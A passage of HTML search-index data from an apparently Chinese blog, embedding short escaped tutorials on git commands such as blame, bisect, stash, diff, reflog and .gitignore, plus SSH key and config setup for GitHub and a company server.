&lt;p&gt;6、点击commond，右侧出现默认，点击默认，修改值为你的git-bash路径&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;以我的举例&lt;/p&gt;
&lt;p&gt;D:\software\git\Git\git-bash.exe&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;7、保存关闭注册表，在任意目录鼠标右键测试&lt;/p&gt;
">42-git-37-鼠标右键手动添加git-bash</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-blame/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;从blame这个词就能大致知道这个命令的作用了&lt;/p&gt;
&lt;p&gt;&lt;code&gt;git blame&lt;/code&gt; 命令可以查看每行代码的提交详情，包括提交人、时间等信息&lt;/p&gt;
&lt;p&gt;当你发现某一行写的有问题时，你就可以查看是谁最后改的这里&lt;/p&gt;
&lt;h2 id=&#34;命令&#34;&gt;命令&lt;/h2&gt;
&lt;p&gt;显示指定文件的历史修改记录&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git blame &amp;lt;filename&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;查看具体的行或范围&#34;&gt;查看具体的行或范围&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;-L&lt;/code&gt;看某一行或某个范围行&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git blame &amp;lt;filename&amp;gt; -L &amp;lt;start&amp;gt;[,&amp;lt;end&amp;gt;]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看第 10 行&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git blame &amp;lt;filename&amp;gt; -L 10,10
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看第 10 行及以后&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git blame &amp;lt;filename&amp;gt; -L 10
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看第 10 到 20 行&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git blame &amp;lt;filename&amp;gt; -L 10,20
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看 10 行以后 5 行的数据&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git blame &amp;lt;filename&amp;gt; -L 10,+5
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看 10 行以前 5 行的数据&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git blame &amp;lt;filename&amp;gt; -L 10,-5
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;查看某个函数&#34;&gt;查看某个函数&lt;/h3&gt;
&lt;p&gt;通过函数名来查看一个区域块的代码，只能识别文件最外层的方法名和类名&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git blame &amp;lt;filename&amp;gt; -L:&amp;lt;func_name&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
">41-git-36-blame</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-bisect/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;用来查找哪一次代码提交引入了错误。&lt;/p&gt;
&lt;p&gt;它的原理很简单，就是将代码提交的历史，按照两分法不断缩小定位。所谓&amp;quot;两分法&amp;quot;，就是将代码历史一分为二，确定问题出在前半部分，还是后半部分，不断执行这个过程，直到范围缩小到某一次代码提交。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1625311032096.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;命令&#34;&gt;命令&lt;/h2&gt;
&lt;h3 id=&#34;启动查错&#34;&gt;启动查错&lt;/h3&gt;
&lt;p&gt;&amp;quot;终点&amp;quot;是最近的提交，&amp;quot;起点&amp;quot;是更久以前的提交。它们之间的这段历史，就是差错的范围。&lt;/p&gt;
&lt;p&gt;我们可以将起点置为第一次，也可以置为我们知道的具体某个commit&lt;/p&gt;
&lt;p&gt;现在，我们选择全部的代码历史。起点是第一次提交&lt;code&gt;4d83cf&lt;/code&gt;，终点是最近一次的&lt;code&gt;HEAD&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git bisect start [终点] [起点]
git bisect start HEAD 4d83cf
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;执行上面的命令以后，代码库就会切换到这段范围正当中的那一次提交&lt;/p&gt;
&lt;p&gt;假如这个库一共有101次提交。那么就会切换到第51次提交。&lt;/p&gt;
&lt;h3 id=&#34;标识正确&#34;&gt;标识正确&lt;/h3&gt;
&lt;p&gt;现在刷新浏览器，发现功能正常。使用&lt;code&gt;git bisect good&lt;/code&gt;命令，标识本次提交（第51次）没有问题。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git bisect good
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;既然第51次提交没有问题，就意味着错误是在代码历史的后半段引入的。执行上面的命令，Git 就自动切换到后半段的中点（第76次提交）。&lt;/p&gt;
&lt;h3 id=&#34;标志错误&#34;&gt;标志错误&lt;/h3&gt;
&lt;p&gt;现在刷新浏览器,发现功能不正常。使用&lt;code&gt;git bisect bad&lt;/code&gt;命令，标识本次提交（第76）有问题。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git bisect bad
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;执行上面的命令以后，Git 就自动切换到第51次到第76次的中点（第63次提交）。&lt;/p&gt;
&lt;p&gt;接下来，不断重复这个过程，直到成功找到出问题的那一次提交为止。这时，Git 会给出如下的提示。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;b47892 is the first bad commit
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;既然找到那个有问题的提交，就可以&lt;a href=&#34;https://github.com/bradleyboy/bisectercise/commit/b47892adec22ee3b0330aff37cbc5e695dfb99d6&#34;&gt;检查代码&lt;/a&gt;，确定具体是什么错误。&lt;/p&gt;
&lt;h3 id=&#34;退出查错&#34;&gt;退出查错&lt;/h3&gt;
&lt;p&gt;然后，使用&lt;code&gt;git bisect reset&lt;/code&gt;命令，退出查错，回到最近一次的代码提交。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git bisect reset
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;现在就可以开始修复错误了。&lt;/p&gt;
&lt;h2 id=&#34;转载&#34;&gt;转载&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;阮一峰&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://www.ruanyifeng.com/blog/2018/12/git-bisect.html&#34;&gt;http://www.ruanyifeng.com/blog/2018/12/git-bisect.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
">40-git-35-bisect</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-gitignore/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;一些工作区中的文件不需要提交到远程，所以需要让git忽略他们，不对其进行检测，方法就是创建.gitignore文件&lt;/p&gt;
&lt;h2 id=&#34;忽略规则&#34;&gt;忽略规则&lt;/h2&gt;
&lt;h3 id=&#34;语法&#34;&gt;语法&lt;/h3&gt;
&lt;p&gt;以斜杠&lt;code&gt;/&lt;/code&gt;开头表示目录；&lt;br&gt;
以星号&lt;code&gt;*&lt;/code&gt;通配多个字符；&lt;br&gt;
以问号&lt;code&gt;?&lt;/code&gt;通配单个字符&lt;br&gt;
以方括号&lt;code&gt;[]&lt;/code&gt;包含单个字符的匹配列表；&lt;br&gt;
以叹号&lt;code&gt;!&lt;/code&gt;表示不忽略(跟踪)匹配到的文件或目录；&lt;/p&gt;
&lt;p&gt;此外，git 对于 .ignore 配置文件是按行从上到下进行规则匹配的，意味着如果前面的规则匹配的范围更大，则后面的规则将不会生效；&lt;/p&gt;
&lt;h3 id=&#34;示例&#34;&gt;示例&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;忽略&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# 忽略根目录下的public下的所有目录及文件
/public/*

# 忽略所有目录名为public下的所有目录及文件
public/*

# 忽略具体的文件
/public/index.html

# 忽略所有的.zip文件
*.zip

# 忽略 a.zip b.zip
[ab].zip
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;保留&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# 不过滤该文件夹
!src/
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;问题&#34;&gt;问题&lt;/h2&gt;
&lt;h3 id=&#34;忽略规则不生效&#34;&gt;忽略规则不生效&lt;/h3&gt;
&lt;p&gt;原因是当前文件已经被加入到git仓库中&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git rm -r --cached .
git add .
git commit -m &#39;update .gitignore&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;网站&#34;&gt;网站&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/github/gitignore&#34;&gt;https://github.com/github/gitignore&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.toptal.com/developers/gitignore&#34;&gt;gitignore.io&lt;/a&gt;&lt;/p&gt;
">39-git-34-gitignore</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-pei-zhi-ssh-key/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;ssh可以基于密码进行认证，也可以基于密钥去认证用户，基于密钥认证时可以实现免密码登录的效果。&lt;/p&gt;
&lt;p&gt;SSH公钥默认存储在账户的主目录下的&lt;code&gt;~/.ssh&lt;/code&gt;目录&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ssh-keygen&lt;/code&gt;生成私钥id_rsa以及对应的公钥&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-t&lt;/code&gt;选项表示指定密钥的类型(The type of the key to generate)&lt;/p&gt;
&lt;p&gt;​	即指定算法，版本2的ssh协议可以指定的密钥类型有 “dsa”, “ecdsa”, “ed25519”, “rsa”&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-C&lt;/code&gt; 选项表示用于识别这个密钥的注释 (comment to identify the key )&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-f&lt;/code&gt;选项表示直接指定密钥生成位置以及密钥的名称，默认id_rsa（私钥id_rsa，公钥id_rsa.pub）&lt;/p&gt;
&lt;h2 id=&#34;单个&#34;&gt;单个&lt;/h2&gt;
&lt;p&gt;1、生成密钥对&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;ssh-keygen -t rsa -C &amp;quot;your-email@email.com&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;2、查看公钥并复制&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;cat ~/.ssh/id_rsa.pub
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;3、登录账户并添加ssh key&lt;/p&gt;
&lt;h2 id=&#34;多个&#34;&gt;多个&lt;/h2&gt;
&lt;p&gt;1、生成密钥对&lt;/p&gt;
&lt;p&gt;GitHub&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;ssh-keygen -t rsa -f ~/.ssh/id_rsa.github -C &#39;email&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;company&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;ssh-keygen -t rsa -f ~/.ssh/id_rsa.company -C &amp;quot;email&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;此时，&lt;code&gt;~/.ssh&lt;/code&gt;目录下应该有4个文件：&lt;code&gt;id_rsa.company&lt;/code&gt;文件和&lt;code&gt;id_rsa.company.pub&lt;/code&gt;文件，还有&lt;code&gt;id_rsa.github&lt;/code&gt;文件和&lt;code&gt;id_rsa.github.pub&lt;/code&gt;文件。&lt;/p&gt;
&lt;p&gt;2、查看公钥并添加到github和gitlab&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cat ~/.ssh/id_rsa.pub
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;3、新增并配置config文件&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;touch ~/.ssh/config
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;参数说明：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Host&lt;/code&gt;：定义&lt;strong&gt;Host&lt;/strong&gt;的名字,（建议与HostName一致）&lt;/p&gt;
&lt;p&gt;&lt;code&gt;HostName&lt;/code&gt;：这个是真实的域名地址，要登录主机的主机名。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Port&lt;/code&gt;：端口号（如果不是默认22端口，则需要指定端口号）&lt;/p&gt;
&lt;p&gt;&lt;code&gt;User&lt;/code&gt;：配置登录名，例如：GitHub的username。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;IdentityFile&lt;/code&gt;：指定私钥文件的路径，也就是&lt;code&gt;id_rsa&lt;/code&gt;文件的绝对路径。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;PreferredAuthentications&lt;/code&gt;：配置登录时用什么权限认证，可设为&lt;code&gt;publickey,password publickey,keyboard-interactive等&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;内容格式如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;Host 域名或者IP
User test
IdentityFile ~/.ssh/id_rsa.company
PreferredAuthentications publickey
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;举例：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;// github
Host github.com
HostName github.com
User lee
IdentityFile /Users/lee/.ssh/id_rsa.github
PreferredAuthentications publickey

// company
Host company
HostName 192.168.1.222
User lee
IdentityFile ~/.ssh/id_rsa.company
PreferredAuthentications publickey
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git clone git@company:lee/test.git
&lt;/code&gt;&lt;/pre&gt;
">38-git-33-配置ssh-key</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-stash/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;git stash&lt;/code&gt;命令用于暂时保存没有提交的工作。运行该命令后，所有没有commit的代码，都会暂时从工作区移除，回到上次commit时的状态。&lt;/p&gt;
&lt;h2 id=&#34;命令&#34;&gt;命令&lt;/h2&gt;
&lt;h3 id=&#34;新增暂存&#34;&gt;新增暂存&lt;/h3&gt;
&lt;p&gt;暂时保存没有提交的工作&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git stash
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;查看暂存&#34;&gt;查看暂存&lt;/h3&gt;
&lt;p&gt;查看暂存列表&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git stash list
---
stash@{0}: WIP on workbranch: 56cd5d4 Revert &amp;quot;update old files&amp;quot;
stash@{1}: WIP on project1: 1dd87ea commit &amp;quot;fix typos and grammar&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;展示目前存在的stash&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git stash show -p
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;恢复暂存&#34;&gt;恢复暂存&lt;/h3&gt;
&lt;h4 id=&#34;需手动删除&#34;&gt;需手动删除&lt;/h4&gt;
&lt;p&gt;恢复stash 列表的第一条stash 的内容，即最近的一次暂存,不会自动删除取出的修改&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git stash apply stash@{0}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;取出指定某一次的修改,不会自动删除取出的修改&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git stash apply stash@{[number]}
git stash apply stash@{1}
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;h4 id=&#34;自动删除&#34;&gt;自动删除&lt;/h4&gt;
&lt;p&gt;恢复stash 列表的第一条stash 的内容并自动删除&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git stash pop stash@{0}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;取出最近一次的修改并自动删除，作用同上，书写更简便&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git stash pop
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;删除暂存&#34;&gt;删除暂存&lt;/h3&gt;
&lt;p&gt;删除stash 列表的第一条stash 的内容&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git stash drop stash@{0}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;清空stash 列表&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git stash clear
&lt;/code&gt;&lt;/pre&gt;
">37-git-32-stash</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-remote/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;此命令用于管理远程主机(仓库)&lt;/p&gt;
&lt;h2 id=&#34;命令&#34;&gt;命令&lt;/h2&gt;
&lt;h3 id=&#34;查看&#34;&gt;查看&lt;/h3&gt;
&lt;p&gt;列出所有远程主机&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git remote
---
origin
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看远程主机的网址&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git remote -v
---
origin  git@github.com:jquery/jquery.git (fetch)
origin  git@github.com:jquery/jquery.git (push)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看该主机的详细信息&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git remote show &amp;lt;主机名&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;添加&#34;&gt;添加&lt;/h3&gt;
&lt;p&gt;添加远程主机&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git remote add &amp;lt;主机名&amp;gt; &amp;lt;网址&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;删除&#34;&gt;删除&lt;/h3&gt;
&lt;p&gt;删除远程主机&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git remote rm &amp;lt;主机名&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;更改名称&#34;&gt;更改名称&lt;/h3&gt;
&lt;p&gt;更改远程主机的名称&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git remote rename &amp;lt;原主机名&amp;gt; &amp;lt;新主机名&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;克隆时指定名称&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git clone -o &amp;lt;主机名&amp;gt; &amp;lt;网址&amp;gt;
git clone -o jQuery https://github.com/jquery/jquery.git

git remote
---
jQuery
&lt;/code&gt;&lt;/pre&gt;
">36-git-31-remote</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-mv/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;平时我们会遇到重命名文件的情况，git会把重命名的操作理解为以下几步&lt;/p&gt;
&lt;p&gt;1、先删除了原文件&lt;/p&gt;
&lt;p&gt;2、添加了新文件&lt;/p&gt;
&lt;p&gt;3、将变更添加到暂存区&lt;/p&gt;
&lt;p&gt;以上几步可以使用git命令直接完成&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git mv [old-name] [new-name]
&lt;/code&gt;&lt;/pre&gt;
">35-git-30-mv</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-rm/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;平时我们都会有删除文件的需求，正常操作为&lt;/p&gt;
&lt;p&gt;1、在文件系统中删除某文件&lt;/p&gt;
&lt;p&gt;2、在git中将删除文件的变更添加到暂存区。&lt;/p&gt;
&lt;p&gt;上述两步操作可以通过一条命令来完成，即&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git rm [file]
&lt;/code&gt;&lt;/pre&gt;
">34-git-29-rm</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-rev-parse/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;显示某个指示符的SHA1哈希值。&lt;/p&gt;
&lt;h2 id=&#34;命令&#34;&gt;命令&lt;/h2&gt;
&lt;p&gt;通过提交名获取到对应提交的哈希码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git rev-parse HEAD
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过哈希码的缩写获取到完整的哈希码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git rev-parse a63d5b
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过分支名获取到对应提交的哈希码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git rev-parse master
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过标签名获取到对应提交的哈希码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git rev-parse v1.0.0
&lt;/code&gt;&lt;/pre&gt;
">33-git-28-rev-parse</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-diff/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;git diff&lt;/code&gt;命令用于查看文件之间的差异。&lt;/p&gt;
&lt;h2 id=&#34;命令&#34;&gt;命令&lt;/h2&gt;
&lt;h3 id=&#34;工作区与暂存区&#34;&gt;工作区与暂存区&lt;/h3&gt;
&lt;p&gt;查看工作区与暂存区的差异&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git diff
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看工作区与暂存区某个文件的差异&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git diff [file]
git diff file.txt
// 或
git diff -- [file]
git diff -- ./[file]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看工作区与暂存区多个文件的差异，以空格分隔&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git diff -- [file1] [file2]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看工作区与暂存区目录下所有文件的差异&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git diff -- [dir]/
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;工作区与commit快照&#34;&gt;工作区与commit快照&lt;/h3&gt;
&lt;p&gt;查看工作区与上一次commit之间的差异&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git diff HEAD
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看工作区与某个 commit 的差异&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git diff [commit]
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;p&gt;当我们修改工作区的内容后，我们没有暂存，也没有提交，所以此时暂存区和仓库的状态是相同的。&lt;/p&gt;
&lt;p&gt;即此时&lt;code&gt;git diff&lt;/code&gt; 与&lt;code&gt;git diff HEAD&lt;/code&gt;返回的结果是完全相同的&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;当我们执行&lt;code&gt;git add&lt;/code&gt;命令后，此时&lt;code&gt;git diff&lt;/code&gt;不会显示任何内容，因为此时工作区与暂存区没有差异。&lt;/p&gt;
&lt;p&gt;但是如果执行&lt;code&gt;git diff HEAD&lt;/code&gt;命令，仍然可以查看到工作区和提交之间的差异。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;假如此时再次修改工作区的内容，我们就能同时对比工作区和(暂存区/仓库)的差异&lt;/p&gt;
&lt;p&gt;并且此时暂存区和仓库也是有差异的&lt;/p&gt;
&lt;h3 id=&#34;暂存区与仓库区&#34;&gt;暂存区与仓库区&lt;/h3&gt;
&lt;p&gt;查看暂存区与当前 commit 的差异&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git diff --cached
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;对比两次提交&#34;&gt;对比两次提交&lt;/h3&gt;
&lt;p&gt;显示两次提交之间的差异&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git diff [first-commit] [second-commit]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们也可以使用引用，更加方便的对比，比如：最新提交和上一次提交&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git diff HEAD HEAD~
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;对比两个分支&#34;&gt;对比两个分支&lt;/h3&gt;
&lt;p&gt;即对比两个分支上最新提交之间的差异&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git diff [first-branch] [second-branch]
git diff master dev
// 等效于
git diff [first-branch]..[second-branch]
git diff maste..dev
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看自从topic分支建立以后，master分支发生的变化&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git diff topic...master
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
&lt;p&gt;查看工作区与暂存区的差异&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git diff
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看工作区与上一次commit之间的差异&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git diff HEAD
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看暂存区与当前 commit 的差异&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git diff --cached
&lt;/code&gt;&lt;/pre&gt;
">32-git-27-diff</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-reflog/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;相当于版本控制的版本控制&lt;/p&gt;
&lt;p&gt;git reflog 可以查看所有分支的所有操作记录&lt;/p&gt;
&lt;p&gt;包括已经被删除的 commit 记录&lt;/p&gt;
&lt;h2 id=&#34;应用场景&#34;&gt;应用场景&lt;/h2&gt;
&lt;p&gt;分支误删除；&lt;/p&gt;
&lt;p&gt;节点误回退&lt;/p&gt;
&lt;p&gt;git rebase等等&lt;/p&gt;
&lt;p&gt;我们都可以从git reflog中找到操作记录&lt;/p&gt;
&lt;p&gt;这时，我们找到要恢复的commitID&lt;/p&gt;
&lt;p&gt;执行以下命令即可&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git reset --hard [commitID]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;假如说回退的节点之后，又添加了一些提交，可以配合使用cherry-pick&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git cherry-pick [commitID]
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;与git-log的对比&#34;&gt;与git log的对比&lt;/h2&gt;
&lt;p&gt;git log 是顺着当前分支往前去查找提交记录，遍历提交历史。&lt;/p&gt;
&lt;p&gt;git reflog不是仓库的一部分，不包含推送、更新和克隆，而是作为本地提交记录的清单。即本地后悔药。&lt;/p&gt;
&lt;h3 id=&#34;reflog&#34;&gt;reflog&lt;/h3&gt;
&lt;p&gt;reflog是一个本地结构，它记录了HEAD和分支引用在过去指向的位置，即HEAD指向的提交的有序列表。&lt;/p&gt;
&lt;p&gt;reflog信息没法与其他任何人共享，每个人都是自己特有的reflog。&lt;/p&gt;
&lt;p&gt;重要的一点是，它不是永久保存的，有一个可配置的过期时间，reflog中过期的信息会被自动删除。&lt;/p&gt;
&lt;h3 id=&#34;log&#34;&gt;log&lt;/h3&gt;
&lt;p&gt;git log显示当前HEAD及其祖先。&lt;/p&gt;
&lt;p&gt;也就是说，它打印提交HEAD指向，然后它的父，其父，等等。&lt;/p&gt;
&lt;p&gt;它通过递归查找每个提交的父进程遍历回购的祖先。&lt;/p&gt;
